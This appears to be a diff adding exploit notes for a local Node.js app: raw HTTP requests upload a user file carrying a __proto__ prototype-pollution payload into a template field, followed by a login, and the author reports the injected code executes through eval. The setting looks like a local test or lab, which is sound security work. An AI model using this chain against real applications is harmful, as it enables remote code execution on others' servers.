@@ -168,3 +168,72 @@ const result = eval(wrapperFunction);
 -------------
 
 
+
+
+
+
+
+
+If you send
+
+
+POST /upload/users HTTP/1.1
+Host: localhost:3000
+Content-Length: 420
+Cache-Control: max-age=0
+sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-GB,en;q=0.9
+Origin: http://localhost:3000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFgVP8bepPyvfE2Ci
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3AO-ToTSvib1hWPHw3krb3ojlxqTNJ7NAa.eq47DhGdZBjNMhlesSvkHiz4MuPxN7HM1F0aUCP52cI
+Connection: keep-alive
+
+------WebKitFormBoundaryFgVP8bepPyvfE2Ci
+Content-Disposition: form-data; name="upload-users"; filename="testusers"
+Content-Type: application/octet-stream
+
+[{"username":"test1","lcUsername":"test1","password":"12","joinDate":"2026-04-23T14:17:15.653Z","licensePlate":"AAA111","img":"/images/profile.png", "__proto__":{"userAutoCreateTemplate":"${console.log('success')}"}}]
+------WebKitFormBoundaryFgVP8bepPyvfE2Ci--
+
+
+
+Followed by 
+
+POST /login HTTP/1.1
+Host: localhost:3000
+Content-Length: 21
+Cache-Control: max-age=0
+sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: http://localhost:3000
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+username=a&password=a
+
+
+The server does not crash. It only crashes at the first GET request. It also executes the command in userAutoCreateTemplate
+
+
